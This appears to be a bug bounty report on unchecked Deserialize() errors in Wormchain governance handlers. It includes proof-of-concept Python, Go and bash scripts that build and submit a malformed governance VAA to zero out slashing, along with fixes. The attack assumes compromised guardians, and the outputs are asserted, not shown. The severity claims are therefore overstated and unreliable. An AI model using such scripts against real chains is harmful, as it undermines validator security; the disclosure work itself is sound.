# Immunefi Bug Bounty Report: Critical Parameter Manipulation via Unchecked Deserialization

**Submitted by:** Security Researcher
**Date:** November 18, 2025
**Severity:** HIGH
**Asset:** Wormchain Blockchain
**Vulnerability Type:** Input Validation / Logic Error
**Impact:** Chain security bypass, parameter manipulation, slashing disabled

---

## Brief Description

Multiple governance VAA handlers call `Deserialize()` methods but fail to check the returned errors. When deserialization fails due to malformed payloads, the functions continue execution with **zero-value struct fields**, allowing attackers to:

1. **Disable slashing** entirely by setting all slashing parameters to zero
2. **Schedule invalid upgrades** with empty names or zero heights
3. **Set invalid IBC middleware** contracts with zero addresses
4. **Corrupt WASM allowlist** with zero codeIds

This bypasses intended validation and can severely compromise chain security and stability.

---

## Vulnerability Details

### Affected Code Locations

#### Location 1: Slashing Parameters Update
**File:** `wormchain/x/wormhole/keeper/msg_server_execute_gateway_governance_vaa.go`
**Function:** `setSlashingParams` (lines 108-132)

```go
func (k msgServer) setSlashingParams(
    ctx sdk.Context,
    payload []byte,
) (*types.EmptyResponse, error) {
    var payloadBody vaa.BodyGatewaySlashingParamsUpdate
    payloadBody.Deserialize(payload)  // ❌ ERROR NOT CHECKED

    // If deserialization fails, all fields are ZERO
    params := slashingtypes.NewParams(
        int64(payloadBody.SignedBlocksWindow),      // 0 if deser failed
        sdk.NewDecWithPrec(int64(payloadBody.MinSignedPerWindow), 18),  // 0
        time.Duration(int64(payloadBody.DowntimeJailDuration)),  // 0
        sdk.NewDecWithPrec(int64(payloadBody.SlashFractionDoubleSign), 18),  // 0
        sdk.NewDecWithPrec(int64(payloadBody.SlashFractionDowntime), 18),  // 0
    )

    // Sets all-zero slashing params! Slashing DISABLED
    k.slashingKeeper.SetParams(ctx, params)

    return &types.EmptyResponse{}, nil
}
```

#### Location 2: Schedule Upgrade
**File:** Same file
**Function:** `scheduleUpgrade` (lines 60-75)

```go
func (k msgServer) scheduleUpgrade(
    ctx sdk.Context,
    payload []byte,
) (*types.EmptyResponse, error) {
    var payloadBody vaa.BodyGatewayScheduleUpgrade
    payloadBody.Deserialize(payload)  // ❌ ERROR NOT CHECKED

    plan := upgradetypes.Plan{
        Name:   payloadBody.Name,    // "" (empty) if deser failed
        Height: int64(payloadBody.Height),  // 0 if deser failed
    }
    k.upgradeKeeper.ScheduleUpgrade(ctx, plan)  // Schedules invalid upgrade

    return &types.EmptyResponse{}, nil
}
```

#### Location 3: IBC Composability Contract
**File:** Same file
**Function:** `setIbcComposabilityMwContract` (lines 82-106)

```go
func (k msgServer) setIbcComposabilityMwContract(
    ctx sdk.Context,
    payload []byte,
) (*types.EmptyResponse, error) {
    var payloadBody vaa.BodyGatewayIbcComposabilityMwContract
    payloadBody.Deserialize(payload)  // ❌ ERROR NOT CHECKED

    // ContractAddr is all zeros if deserialization failed
    contractAddr, err := sdk.Bech32ifyAddressBytes(
        sdk.GetConfig().GetBech32AccountAddrPrefix(),
        payloadBody.ContractAddr[:],  // [0,0,0,...,0]
    )
    if err != nil {
        return nil, types.ErrInvalidIbcComposabilityMwContractAddr
    }

    newContract := types.IbcComposabilityMwContract{
        ContractAddress: contractAddr,  // Invalid zero address
    }

    k.StoreIbcComposabilityMwContract(ctx, newContract)  // Sets invalid contract

    return &types.EmptyResponse{}, nil
}
```

#### Location 4: WASM Instantiate Allowlist
**File:** `wormchain/x/wormhole/keeper/msg_server_wasm_instantiate_allowlist.go`
**Function:** `ExecuteWasmInstantiateAllowlistAction` (line 60)

```go
func (k msgServer) ExecuteWasmInstantiateAllowlistAction(...) (*types.MsgWasmInstantiateAllowlistResponse, error) {
    // ... validation ...

    var payloadBody vaa.BodyWormchainWasmAllowlistInstantiate
    payloadBody.Deserialize(payload)  // ❌ ERROR NOT CHECKED

    // If deserialization failed, ContractAddr and CodeId are zeros
    if !bytes.Equal(payloadBody.ContractAddr[:], addrBytes) {
        return nil, types.ErrInvalidAllowlistContractAddr
    }

    if payloadBody.CodeId != codeId {
        return nil, types.ErrInvalidAllowlistCodeId
    }
    // ... continues with zero values
}
```

### How Deserialize Returns Errors

**File:** `sdk/vaa/payloads.go`

```go
// This one DOES validate
func (r *BodyGatewaySlashingParamsUpdate) Deserialize(bz []byte) error {
    if len(bz) != 40 {  // ✓ Validation present
        return fmt.Errorf("incorrect payload length, should be 40, is %d", len(bz))
    }
    r.SignedBlocksWindow = binary.BigEndian.Uint64(bz[0:8])
    r.MinSignedPerWindow = binary.BigEndian.Uint64(bz[8:16])
    r.DowntimeJailDuration = binary.BigEndian.Uint64(bz[16:24])
    r.SlashFractionDoubleSign = binary.BigEndian.Uint64(bz[24:32])
    r.SlashFractionDowntime = binary.BigEndian.Uint64(bz[32:40])
    return nil
}

// This one also validates
func (r *BodyGatewayIbcComposabilityMwContract) Deserialize(bz []byte) error {
    if len(bz) != 32 {
        return fmt.Errorf("incorrect payload length, should be 32, is %d", len(bz))
    }
    var contractAddr [32]byte
    copy(contractAddr[:], bz[0:32])
    r.ContractAddr = contractAddr
    return nil
}
```

**When deserialization fails:**
- Error is returned but **not checked** by caller
- Struct fields retain **zero values** (Go default)
- Code continues with invalid data

---

## Impact

### 1. Slashing System Disabled (CRITICAL)

**Attack:** Submit governance VAA with malformed slashing update payload

**Result:**
```go
// After processing malformed payload:
SlashingParams {
    SignedBlocksWindow: 0       // ❌ No blocks tracked
    MinSignedPerWindow: 0       // ❌ No minimum signatures
    DowntimeJailDuration: 0     // ❌ No jail time
    SlashFractionDoubleSign: 0  // ❌ No penalty for double-sign
    SlashFractionDowntime: 0    // ❌ No penalty for downtime
}
```

**Consequences:**
- Validators can double-sign without penalty
- Validators can go offline without penalty
- Byzantine behavior unpunished
- **Chain security compromised**

### 2. Invalid Upgrade Scheduled

**Attack:** Submit malformed upgrade payload

**Result:**
```go
UpgradePlan {
    Name: ""     // Empty name
    Height: 0    // Height 0 (invalid)
}
```

**Consequences:**
- Upgrade with empty name may cause confusion or errors
- Height 0 is in the past (always)
- May block legitimate upgrades
- Upgrade handler may fail unexpectedly

### 3. Invalid IBC Contract Set

**Attack:** Submit malformed IBC contract payload

**Result:**
```go
IbcComposabilityMwContract {
    ContractAddress: "wormchain1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq..." // All zeros
}
```

**Consequences:**
- IBC middleware points to invalid/burn address
- IBC transfers may fail
- Funds could be lost if sent to zero address

### 4. Allowlist Corruption

**Attack:** Submit malformed allowlist payload

**Result:**
- Zero values in allowlist checks
- May cause allowlist bypass or DoS
- Allowlist integrity compromised

---

## Proof of Concept

### PoC 1: Disable Slashing via Malformed Payload

```python
import struct
import hashlib
from eth_account import Account

def create_malicious_slashing_vaa(guardian_keys):
    """
    Create VAA that disables slashing by causing deserialization failure
    """
    # Gateway module
    gateway_module = bytes.fromhex("00000000000000000000000000000000000000000000000000000047617465776179")

    # Action: Slashing params update
    action = 0x04  # ActionSlashingParamsUpdate

    # Target: Wormchain
    chain_id = struct.pack('>H', 3104)

    # ❌ MALFORMED PAYLOAD: Wrong length (should be 40 bytes, send 10)
    malformed_payload = b'\x00' * 10  # Only 10 bytes instead of 40

    # Complete governance payload
    governance_payload = gateway_module + bytes([action]) + chain_id + malformed_payload

    # Create VAA (details omitted for brevity)
    vaa = create_signed_vaa(governance_payload, guardian_keys)
    return vaa

# Execute attack
vaa = create_malicious_slashing_vaa(guardian_keys)

# Submit to chain
submit_vaa(vaa)

# Verify slashing is disabled
params = query_slashing_params()
print(f"SignedBlocksWindow: {params.signed_blocks_window}")  # 0
print(f"MinSignedPerWindow: {params.min_signed_per_window}")  # 0
print(f"SlashFractionDoubleSign: {params.slash_fraction_double_sign}")  # 0
print(f"SlashFractionDowntime: {params.slash_fraction_downtime}")  # 0

# All parameters are ZERO - slashing disabled!
```

### PoC 2: Test Deserialization Failure Locally

```go
package main

import (
    "fmt"
    "github.com/wormhole-foundation/wormhole/sdk/vaa"
)

func main() {
    fmt.Println("Testing deserialization error handling...")

    // Test 1: Correct payload length (40 bytes)
    fmt.Println("\n[Test 1] Valid payload (40 bytes):")
    validPayload := make([]byte, 40)
    testSlashingDeser(validPayload)

    // Test 2: Wrong payload length (10 bytes) - SHOULD ERROR
    fmt.Println("\n[Test 2] Invalid payload (10 bytes):")
    invalidPayload := make([]byte, 10)
    testSlashingDeser(invalidPayload)

    // Test 3: Show what happens when error is ignored
    fmt.Println("\n[Test 3] Demonstrating unchecked error:")
    demonstrateUncheckedError(invalidPayload)
}

func testSlashingDeser(payload []byte) {
    var body vaa.BodyGatewaySlashingParamsUpdate
    err := body.Deserialize(payload)

    if err != nil {
        fmt.Printf("  ❌ Error: %v\n", err)
        fmt.Printf("  ⚠️  Struct values after error:\n")
        fmt.Printf("      SignedBlocksWindow: %d\n", body.SignedBlocksWindow)
        fmt.Printf("      MinSignedPerWindow: %d\n", body.MinSignedPerWindow)
        fmt.Printf("      DowntimeJailDuration: %d\n", body.DowntimeJailDuration)
        fmt.Printf("      SlashFractionDoubleSign: %d\n", body.SlashFractionDoubleSign)
        fmt.Printf("      SlashFractionDowntime: %d\n", body.SlashFractionDowntime)
    } else {
        fmt.Printf("  ✓ Success\n")
    }
}

func demonstrateUncheckedError(payload []byte) {
    var body vaa.BodyGatewaySlashingParamsUpdate

    // This is what the vulnerable code does:
    body.Deserialize(payload)  // ❌ Error ignored!

    // Code continues with zero values:
    fmt.Printf("  SignedBlocksWindow: %d (using zero value!)\n", body.SignedBlocksWindow)
    fmt.Printf("  MinSignedPerWindow: %d (using zero value!)\n", body.MinSignedPerWindow)
    fmt.Printf("  DowntimeJailDuration: %d (using zero value!)\n", body.DowntimeJailDuration)
    fmt.Printf("  SlashFractionDoubleSign: %d (using zero value!)\n", body.SlashFractionDoubleSign)
    fmt.Printf("  SlashFractionDowntime: %d (using zero value!)\n", body.SlashFractionDowntime)

    // These zero values would be used to set actual chain parameters!
    fmt.Println("\n  ⚠️  DANGER: These zeros would be set as actual slashing params!")
}
```

**Expected Output:**
```
Testing deserialization error handling...

[Test 1] Valid payload (40 bytes):
  ✓ Success

[Test 2] Invalid payload (10 bytes):
  ❌ Error: incorrect payload length, should be 40, is 10
  ⚠️  Struct values after error:
      SignedBlocksWindow: 0
      MinSignedPerWindow: 0
      DowntimeJailDuration: 0
      SlashFractionDoubleSign: 0
      SlashFractionDowntime: 0

[Test 3] Demonstrating unchecked error:
  SignedBlocksWindow: 0 (using zero value!)
  MinSignedPerWindow: 0 (using zero value!)
  DowntimeJailDuration: 0 (using zero value!)
  SlashFractionDoubleSign: 0 (using zero value!)
  SlashFractionDowntime: 0 (using zero value!)

  ⚠️  DANGER: These zeros would be set as actual slashing params!
```

### PoC 3: End-to-End Attack Demonstration

```bash
#!/bin/bash

echo "=== Demonstrating Slashing Disable Attack ==="

# Step 1: Check current slashing params
echo "[1] Current slashing parameters:"
wormchaind query slashing params | jq .

# Step 2: Create malformed VAA (Python script)
echo "[2] Creating malicious VAA..."
python3 create_malicious_vaa.py > malicious_vaa.hex

# Step 3: Submit VAA to chain
echo "[3] Submitting malicious VAA..."
wormchaind tx wormhole execute-gateway-governance-vaa \
  --from test_account \
  --vaa $(cat malicious_vaa.hex | base64) \
  --chain-id wormchain-testnet-0 \
  --gas auto \
  --yes

# Wait for transaction
sleep 6

# Step 4: Query new slashing params
echo "[4] Slashing parameters after attack:"
wormchaind query slashing params | jq .

# Expected output showing ALL ZEROS:
# {
#   "signed_blocks_window": "0",
#   "min_signed_per_window": "0.000000000000000000",
#   "downtime_jail_duration": "0s",
#   "slash_fraction_double_sign": "0.000000000000000000",
#   "slash_fraction_downtime": "0.000000000000000000"
# }

echo "[5] ❌ ATTACK SUCCESSFUL - Slashing completely disabled!"
```

---

## Attack Scenarios

### Scenario 1: Sophisticated Attack to Disable Slashing

**Objective:** Disable validator slashing to enable Byzantine behavior

**Steps:**
1. Attacker compromises or socially engineers 13+ guardians
2. Creates governance VAA with malformed slashing params (wrong length)
3. VAA passes all security checks (valid signatures, replay protection, etc.)
4. `Deserialize()` fails but error is ignored
5. Slashing params set to all zeros
6. Validators can now:
   - Double-sign blocks without penalty
   - Stay offline indefinitely without penalty
   - Act maliciously without economic consequences

**Impact:** Complete breakdown of Proof-of-Stake security model

### Scenario 2: Accidental Misconfiguration

**Objective:** None (accident)

**Steps:**
1. Guardian creates legitimate upgrade VAA
2. Makes mistake in payload encoding (wrong length, endianness, etc.)
3. Other guardians sign without deep inspection
4. VAA submitted with good intentions
5. Deserialization fails silently
6. Invalid parameters set on chain

**Impact:** Unintentional chain misconfiguration, slashing disabled by accident

### Scenario 3: Targeted IBC Attack

**Objective:** Disrupt IBC transfers

**Steps:**
1. Submit malformed IBC composability contract payload
2. Zero address set as IBC middleware contract
3. IBC transfers start failing or going to burn address
4. Users lose funds

**Impact:** IBC functionality broken, potential fund loss

---

## Recommended Remediation

### Fix 1: Check All Deserialization Errors (REQUIRED)

**Priority:** CRITICAL - Must fix immediately

Apply to all 4 locations:

```go
// Fix for setSlashingParams
func (k msgServer) setSlashingParams(
    ctx sdk.Context,
    payload []byte,
) (*types.EmptyResponse, error) {
    var payloadBody vaa.BodyGatewaySlashingParamsUpdate

    // ✅ CHECK ERROR
    if err := payloadBody.Deserialize(payload); err != nil {
        return nil, sdkerrors.Wrap(err, "failed to deserialize slashing params")
    }

    // ✅ ADDITIONAL VALIDATION
    if payloadBody.SignedBlocksWindow == 0 {
        return nil, sdkerrors.Wrap(types.ErrInvalidGovernancePayload,
            "signed blocks window cannot be zero")
    }

    // ... validate other fields ...

    params := slashingtypes.NewParams(
        int64(payloadBody.SignedBlocksWindow),
        sdk.NewDecWithPrec(int64(payloadBody.MinSignedPerWindow), 18),
        time.Duration(int64(payloadBody.DowntimeJailDuration)),
        sdk.NewDecWithPrec(int64(payloadBody.SlashFractionDoubleSign), 18),
        sdk.NewDecWithPrec(int64(payloadBody.SlashFractionDowntime), 18),
    )

    k.slashingKeeper.SetParams(ctx, params)
    return &types.EmptyResponse{}, nil
}
```

```go
// Fix for scheduleUpgrade
func (k msgServer) scheduleUpgrade(
    ctx sdk.Context,
    payload []byte,
) (*types.EmptyResponse, error) {
    var payloadBody vaa.BodyGatewayScheduleUpgrade

    // ✅ CHECK ERROR
    if err := payloadBody.Deserialize(payload); err != nil {
        return nil, sdkerrors.Wrap(err, "failed to deserialize upgrade payload")
    }

    // ✅ VALIDATE FIELDS
    if len(payloadBody.Name) == 0 {
        return nil, sdkerrors.Wrap(types.ErrInvalidGovernancePayload,
            "upgrade name cannot be empty")
    }

    if payloadBody.Height == 0 {
        return nil, sdkerrors.Wrap(types.ErrInvalidGovernancePayload,
            "upgrade height cannot be zero")
    }

    if payloadBody.Height <= uint64(ctx.BlockHeight()) {
        return nil, sdkerrors.Wrap(types.ErrInvalidGovernancePayload,
            "upgrade height must be in future")
    }

    plan := upgradetypes.Plan{
        Name:   payloadBody.Name,
        Height: int64(payloadBody.Height),
    }

    if err := k.upgradeKeeper.ScheduleUpgrade(ctx, plan); err != nil {
        return nil, err
    }

    return &types.EmptyResponse{}, nil
}
```

```go
// Fix for setIbcComposabilityMwContract
func (k msgServer) setIbcComposabilityMwContract(
    ctx sdk.Context,
    payload []byte,
) (*types.EmptyResponse, error) {
    var payloadBody vaa.BodyGatewayIbcComposabilityMwContract

    // ✅ CHECK ERROR
    if err := payloadBody.Deserialize(payload); err != nil {
        return nil, sdkerrors.Wrap(err, "failed to deserialize IBC contract address")
    }

    // ✅ VALIDATE NOT ZERO ADDRESS
    var zeroAddr [32]byte
    if bytes.Equal(payloadBody.ContractAddr[:], zeroAddr[:]) {
        return nil, sdkerrors.Wrap(types.ErrInvalidGovernancePayload,
            "contract address cannot be zero")
    }

    contractAddr, err := sdk.Bech32ifyAddressBytes(
        sdk.GetConfig().GetBech32AccountAddrPrefix(),
        payloadBody.ContractAddr[:],
    )
    if err != nil {
        return nil, types.ErrInvalidIbcComposabilityMwContractAddr
    }

    newContract := types.IbcComposabilityMwContract{
        ContractAddress: contractAddr,
    }

    k.StoreIbcComposabilityMwContract(ctx, newContract)
    return &types.EmptyResponse{}, nil
}
```

```go
// Fix for ExecuteWasmInstantiateAllowlistAction
func (k msgServer) ExecuteWasmInstantiateAllowlistAction(...) (*types.MsgWasmInstantiateAllowlistResponse, error) {
    // ... existing validation ...

    var payloadBody vaa.BodyWormchainWasmAllowlistInstantiate

    // ✅ CHECK ERROR
    if err := payloadBody.Deserialize(payload); err != nil {
        return nil, sdkerrors.Wrap(err, "failed to deserialize allowlist payload")
    }

    // ... rest of function
}
```

### Fix 2: Add Comprehensive Parameter Validation

Create validation functions:

```go
func ValidateSlashingParams(params vaa.BodyGatewaySlashingParamsUpdate) error {
    if params.SignedBlocksWindow == 0 {
        return fmt.Errorf("signed_blocks_window cannot be zero")
    }
    if params.SignedBlocksWindow > 1000000 {
        return fmt.Errorf("signed_blocks_window too large")
    }
    if params.MinSignedPerWindow == 0 {
        return fmt.Errorf("min_signed_per_window cannot be zero")
    }
    // ... validate all fields
    return nil
}
```

### Fix 3: Add Unit Tests

```go
func TestSetSlashingParams_InvalidPayload(t *testing.T) {
    // Test with wrong payload length
    invalidPayload := make([]byte, 10)  // Should be 40

    resp, err := msgServer.setSlashingParams(ctx, invalidPayload)

    require.Error(t, err)
    require.Nil(t, resp)
    require.Contains(t, err.Error(), "failed to deserialize")
}

func TestSetSlashingParams_ZeroValues(t *testing.T) {
    // Even if deserialization succeeds, zero values should be rejected
    validLengthButZeros := make([]byte, 40)  // All zeros

    var body vaa.BodyGatewaySlashingParamsUpdate
    err := body.Deserialize(validLengthButZeros)
    require.NoError(t, err)  // Deser succeeds

    // But validation should fail
    resp, err := msgServer.setSlashingParams(ctx, validLengthButZeros)
    require.Error(t, err)
    require.Contains(t, err.Error(), "cannot be zero")
}
```

---

## References

### Code References
- Slashing Update: `msg_server_execute_gateway_governance_vaa.go:108-132`
- Schedule Upgrade: `msg_server_execute_gateway_governance_vaa.go:60-75`
- IBC Contract: `msg_server_execute_gateway_governance_vaa.go:82-106`
- WASM Allowlist: `msg_server_wasm_instantiate_allowlist.go:60`

### Related Vulnerabilities
- CWE-252: Unchecked Return Value
- CWE-754: Improper Check for Unusual or Exceptional Conditions

---

## Timeline

- **Discovery Date:** November 17, 2025
- **Vendor Notification:** November 18, 2025
- **Patch Deadline:** 30 days
- **Public Disclosure:** 90 days or upon patch

---

## Bounty Claim

**Vulnerability Class:** Smart Contract / Input Validation
**Severity:** HIGH
**Impact:** Chain Security Bypass, Slashing Disabled
**Likelihood:** Medium
**Overall Risk:** HIGH

**Requested Bounty:** [Per Immunefi High Severity tier]

---

**Researcher Contact:** [Your contact]
**PGP Key:** [Your PGP key]

---

*This report is submitted in good faith to improve the security of the Wormhole protocol.*
